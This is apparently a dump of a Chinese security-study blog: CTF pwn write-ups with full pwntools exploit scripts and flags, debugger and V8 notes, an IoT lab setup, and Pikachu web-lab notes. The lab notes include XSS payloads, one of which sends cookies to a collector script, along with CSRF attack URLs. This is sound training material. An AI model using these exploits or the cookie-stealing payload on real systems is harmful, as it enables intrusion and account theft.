解释：引入pwn、ctypes模块；remote连接其他主机服务；elf=ELF(bin路径)本地运行pwn文件；libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；recvuntil()接收字符串；sendline(payload)发送payload；srand(1)设定随机数种子为1；循环十次；interactive()直接进行交互； 另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag. cyberpeace{c89cf2a54c56f16458a1164851a361b4}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界 cgpwn2","slug":"攻防世界pwn-cgpwn2","date":"2022-08-09T03:17:04.188Z","updated":"2020-09-10T07:29:13.987Z","comments":true,"path":"2022/08/09/攻防世界pwn-cgpwn2/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/","excerpt":"","text":"算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。 name是全局变量，在bss区段，适合写入。 pwn()函数中调用了__system，但并没有‘/bin/sh’ 攻击思路在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。 payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’) 1234567891011from pwn import * # p = process('./cgpwn2')p = remote(\"111.198.29.45\",32966)system_addr = 0x804855Abss_addr = 0x804A080p.recvuntil('name\\n')p.sendline(\"/bin/sh\\x00\")p.recvuntil('here:\\n')payload = 0x26*'a' +'bbbb'+ p32(system_addr) + p32(bss_addr)p.sendline(payload)p.interactive() cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界pwn-100","slug":"攻防世界pwn-100","date":"2022-08-09T03:17:04.186Z","updated":"2022-08-09T03:51:37.530Z","comments":true,"path":"2022/08/09/攻防世界pwn-100/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/","excerpt":"","text":"分析查壳：checksec 64位，无stack,无PIE； 运行程序，输入字符，无反馈，无限制。 ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1. 攻击思路无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。 puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即 pop rdi; retpop rsi; pop r15; ret 注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数传参顺序默认从后先开始传入。x86 x64一样。 此处需要学习利用寄存器传递参数。 关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。 由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。 初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段： 程序还需调用一个gadget,后续另起一篇学习 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 #coding=utf-8from pwn import * # context.log_level = 'debug'io = remote('124.126.19.106',46612) # io = process(\"./pwn-100\")elf = ELF(\"./pwn-100\")rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)pop_rdi_ret = 0x400763 # start_addr = elf.symbols['_start']start_addr = 0x400550puts_plt = elf.plt['puts']read_got = elf.got['read']binsh_addr = 0x601000def leak(addr): payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr) payload = payload.ljust(200, \"a\") io.send(payload) io.recvuntil(\"bye~\\n\") up = \"\" content = \"\" count = 0 while True: c = io.recv(numb=1, timeout=0.5) count += 1 if up == '\\n' and c == \"\": content = content[:-1] + '\\x00' break else: content += c up = c content = content[:4] log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)payload = \"a\" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)payload += p64(rop2)payload += \"\\x00\" * 56 payload += p64(start_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.recvuntil(\"bye~\\n\") # gdb.attach(io)io.send(\"/bin/sh\\x00\")payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界-pwn-stack2","slug":"攻防世界-pwn-stack2","date":"2022-08-09T03:17:04.181Z","updated":"2020-09-10T07:29:13.976Z","comments":true,"path":"2022/08/09/攻防世界-pwn-stack2/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/","excerpt":"","text":"0x01 分析checksec检查： 32位，无PIE，开了NX和canary.运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。 IDA中查看main函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 0x63; ++i ) { __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; } for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) { v3 = j++; v13[v3] = v7; } } if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); } if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; } if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; } return 0;} 发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出： 12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 发现给了/bin/bash: 12345678910111213141516:0804859B ; __unwind {.text:0804859B push ebp.text:0804859C mov ebp, esp.text:0804859E sub esp, 18h.text:080485A1 mov eax, large gs:14h.text:080485A7 mov [ebp+var_C], eax.text:080485AA xor eax, eax.text:080485AC sub esp, 0Ch.text:080485AF push offset command ; \"/bin/bash\".text:080485B4 call _system ;system.text:080485B9 add esp, 10h.text:080485BC nop.text:080485BD mov edx, [ebp+var_C].text:080485C0 xor edx, large gs:14h.text:080485C7 jz short locret_80485CE.text:080485C9 call ___stack_chk_fail 开启动态调试，在v13[v5]=v7处下断点， 转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是： 得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"WinDbg使用整理","slug":"WinDbg使用整理","date":"2022-08-09T03:17:04.136Z","updated":"2022-08-09T03:50:36.972Z","comments":true,"path":"2022/08/09/WinDbg使用整理/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/","excerpt":"","text":"0x00 基础命令 .sympath //显示设置的符号表路径 .reload //此命令主要用于加载符号表。 .reload /f //重新装载模块 .reload /i //强制加载mismatched symbol U //这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度 db //显示一字节的长度。 dw //显示两字节的长度。 dd //显示四字节的长度。 dq //显示八字节的长度。 dD //显示double实数(8字节的长度)。 df //显示float实数(4字节的长度)。 da //显示asscii值 du //显示unicode值 ds //显示ANI_STRING值 dS //显示UNICODE_STRING的值 eb address value //在address 这个地址写入一个字节value ew address value //在address 这个地址写入两字节value ed address value //在address 这个地址写入四字节字节value eq address value //在address 这个地址写入八字节字节value 0x01 对象相关命令 dt //dt命令主要用于查看结构体。 lm //列出模块。 lm vm 模块名 //查看模块详细信息。 !process 0 0 //列出系统进程信息 !process 0 0 进程名 //列出该进程的信息 !process 0 1 进程名 //列出该进程更加的信息 !process 0 7 进程名 //列出该进程的详细信息，包括线程的 .process EPROCESS //切入该进程中 !object 地址 //显示该地址的对象信息。 bp address //在地址address插入断点。 ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。 ba access size 地址 //access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。 bd/be/bc bd 断点号 //此命令是关闭断点号所对应的断点 。 be 断点号 //此命令是开启断点号所对应的断点 。 bc * //去除所有断点。 x //x命令用来模糊查询 x nt!kesdestable* //样查看SSDT表的地址 dds 地址 //此命令用来解析某连续地址的函数名。","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"V8漏洞初学习","slug":"V8漏洞初学习","date":"2022-08-09T03:17:04.132Z","updated":"2022-08-09T03:49:51.822Z","comments":true,"path":"2022/08/09/V8漏洞初学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的 v8编译后二进制名称叫d8. allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试： 123456789browser/x64.release$ ./d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)d8&gt; var a = [1, 2, 3];undefinedd8&gt; %DebugPrint(a);0x2ebcfb54dd41 &lt;JSArray[3]&gt;[1, 2, 3]d8&gt; %SystemBreak();Trace/breakpoint trap (core dumped) 在加载d8时加入此选项可以在js中调试本地运行时函数： %DebugPrint(obj) 输出对象地址%SystemBreak() 触发调试中断主要结合gdb等调试器使用 gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本： source /path/to/gdbinit_v8 下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js： 123456789var a = [1,2,3];var b = [1.1, 2.2, 3.3];var c = [a, b];%DebugPrint(a);%SystemBreak(); //触发第一次调试%DebugPrint(b);%SystemBreak(); //触发第二次调试%DebugPrint(c);%SystemBreak(); //触发第三次调试 gdb运行d8: 123456789root@kali:~/ctf/browser/x64.release$ gdb ./d8pwndbg&gt; set args --allow-natives-syntax ./test.jspwndbg&gt; rStarting program: x64.release/d8 --allow-natives-syntax ./test.js[Thread debugging using libthread_db enabled][New Thread 0x7ff87fde9700 (LWP 18393)][New Thread 0x7ff87f5e8700 (LWP 18394)][New Thread 0x7ff87ede7700 (LWP 18395)]0x12e891f8df11 &lt;JSArray[3]&gt; 可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。 此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。 v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。 telescope命令查看内存数据。 在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58. v8的对象结构和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。 首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。 为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。 但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码add eax,ebx，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。 一个对象在内存中布局大致如下： map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型 prototype：prototype elements:对象元素 length:元素个数 properties:属性 数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图： 由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。 上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。 浏览器V8的解题步骤一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。 参考https://www.codercto.com/a/81538.html 后续需要实践做一下这个ctf题目。","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"}]},{"title":"Ubuntu下buildroot以及qemu环境搭建","slug":"Ubuntu下buildroot以及qemu环境搭建","date":"2022-08-09T03:17:04.125Z","updated":"2022-08-09T03:48:44.635Z","comments":true,"path":"2022/08/09/Ubuntu下buildroot以及qemu环境搭建/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"0x00 搭建环境windows 10VMwareWorkstation proUbuntu 16.04 x64 0x01 安装binwalk12345678sudo susudo apt-get remove binwalksudo spt-get updatesudo apt-get install build-essential autoconf git //获取Gitgit clone https://github.com/devttys0/binwalkcd binwalksudo python setup.py installsudo ./deps.sh 0x02 安装buildroot交叉编译环境安装依赖： sudo apt-get install libncurses5-dev patch 下载buildroot: wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz 1234tar -zxvf buildroot-2020.02.6.tar.gzcd buildroot-2020.02.6make cleanmake menuconfig 出现配置界面： 选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序 在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。 保存退出 sudo make 静等完成。 os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。 测试： 12./mipsel-linux-gcc hello.c -o hello./hello //失败 使用file查看，是小端序的mips程序。 0x03 qemu运行环境12sudo apt-get install qemusudo apt-get install qemu-user-static 测试hello报错/lib/ld-uClibc.so.0: No such file or directory 是因为没有对应架构的链接库的问题在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下， 123sudo cp ld-uClibc-1.0.32.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.31.sosudo ln -s /lib/ld-uClibc-1.0.32.so /lib/ld-uClibc.so.0 还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。 出现新报错：/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0' 解决方案： 123sudo cp libuClibc-1.0.31.so /lib/sudo chown -R root:root /lib/libuClibc-1.0.32.sosudo ln -s /lib/libuClibc-1.0.32.so /lib/libc.so.0 还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。 运行成功。 os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。 0x04 配置网络环境","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"}]},{"title":"pikachu漏洞练习记录1","slug":"pikachu漏洞练习1","date":"2022-08-09T03:17:04.119Z","updated":"2022-08-09T03:42:57.758Z","comments":true,"path":"2022/08/09/pikachu漏洞练习1/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/","excerpt":"","text":"0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin/123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。 查看源码，输入的验证码在本地验证： 可以在bp上不输入验证码或输入错误验证码都可以爆破。 token防爆破？ token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。 基于token的身份验证 客户端使用用户名和密码请求登录 服务端收到请求去验证用户名和密码 验证成功后，服务端会签发一个token，再将token发送给客户端 客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。 客户端每次向服务端请求资源的时候需要带着服务端签发的token 服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。 app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app 提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。 在测试器中，设置password和token两个变量，使用pitchfork。 点击选项，更改请求引擎中线程数为1，重定向选择总是 Grep-Extract选择添加，中间获得回应包，选择token的值复制并选定，点击OK. 回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。 开始攻击，根据不同length找出正确密码，爆破完成。 注：该方法着实鸡肋。 0x02 XSS(跨站脚本)XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。 因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。 输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。 反射性xss(get)随意输入字符串，回显who is xxx,i don’t caref12查看，允许输入最大长度为20. 更改一下可输入长度，输入一个简单的xss语句：&lt;script&gt;alert(\"XSS\")&lt;/script&gt; 发现可以解析，即存在xss漏洞。 观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。 如果是post型xss，无法直接使用url的方式进行攻击。 利用需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。 12345&lt;?php$cookie=$_GET['cookie']; #fp=$fopen(\"cookie.txt\",\"a\");fwirte($fp,\"Cookie:\".$cookie.\"/n\")?&gt; 构造一个xss攻击的js代码 &lt;script&gt;window.open(\"http://127.0.0.1/getcookie.php?cookie=\"+document.cookie);&lt;/script&gt; 新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值…… 反射型xss(post)post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。 可以通过html页面方式提交，构造一个自己的post丢到自己的网站上 随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。 http中get和post的基本区别：get方式在客户端通过url提交数据，数据在url中可以看到；Post方式，数据放置在html header内提交，数据在url中看不到。get只能传输比较少的数据，安全性较低，post传输数据较多。 我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。 存储型xss存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。存储型xss又称永久型xss。 1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。 2.注入&lt;script&gt;alert(\"XSS\")&lt;/script&gt; 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。 DOM型xssDOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。 0x03 CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。 如何确认一个web系统存在csrf漏洞 1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造 修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造； 对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造； 2.确认凭证的有效期 虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。 CSRF(get)登录账号，抓取修改个人信息流量包。 发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。 可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可): http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit 诱使登录状态的用户点击url就可以完成CSRF攻击。 CSRF(post)如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。 步骤同get。但不知为何时灵时不灵。 正常登录状态： 点击恶意url后，用户信息直接被修改。 CSRF(Token)token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。 如图获取修改信息流量包后发现增加了token，无法利用。 防范CSRF措施 增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样 安全的会话管理（避免会话被利用） 不要再客户端保存敏感信息（身份认证信息） 测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。 访问控制安全管理 敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码） 敏感信息的修改尽量使用post（post安全性高于get） 通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer） 增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/web/"}]},{"title":"JIT学习","slug":"JIT学习","date":"2022-08-09T03:17:04.108Z","updated":"2022-08-09T03:41:19.337Z","comments":true,"path":"2022/08/09/JIT学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JIT原理Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。 还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。 技术点从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。 例子： 12345678 #include&lt;stdio.h&gt;int inc(int a) { return a + 1;}int main() { printf(\"%d\\n\", inc(3)); return 0;} objdump -d 1查看它的机器码。 123456780000000000400526 &lt;inc&gt;: 400526: 55 push %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器 400527: 48 89 e5 mov %rsp,%rbp 40052a: 89 7d fc mov %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3 40052d: 8b 45 fc mov -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中 400530: 83 c0 01 add $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递 400533: 5d pop %rbp 400534: c3 retq 我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可： 1234567891011121314151617181920 #include&lt;stdio.h&gt; #include&lt;memory.h&gt; #include&lt;sys/mman.h&gt;typedef int (* inc_func)(int a); int main() { char code[] = { 0x55, // push rbp 0x48, 0x89, 0xe5, // mov rsp, rbp 0x89, 0xf8, // mov edi, eax 0x83, 0xc0, 0x01, // add $1, eax 0x5d, // pop rbp 0xc3 // ret }; void * temp = mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, code, sizeof(code)); inc_func p_inc = (inc_func)temp; printf(\"%d\\n\", p_inc(7)); return 0;} mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。 我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。","categories":[],"tags":[{"name":"chrome知识点","slug":"chrome知识点","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"}]},{"title":"Dlink DIR-823G 漏洞挖掘过程","slug":"Dlink-Dir-823G路由器漏洞挖掘过程","date":"2022-08-09T03:17:04.104Z","updated":"2022-08-09T03:39:15.963Z","comments":true,"path":"2022/08/09/Dlink-Dir-823G路由器漏洞挖掘过程/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/","excerpt":"","text":"固件下载地址： https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA 提取码：1ly1 0x01 漏洞介绍D-Link DIR-823G命令注入漏洞： CVE编号：CVE-2019-15529 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 0x02 分析 binwalk -Me 固件.bin //解开固件 是一个squashfs文件系统，标准linux目录结构。 cat /etc/init.d/rcS //查看路由器开启的服务。 发现一个goahead进程。 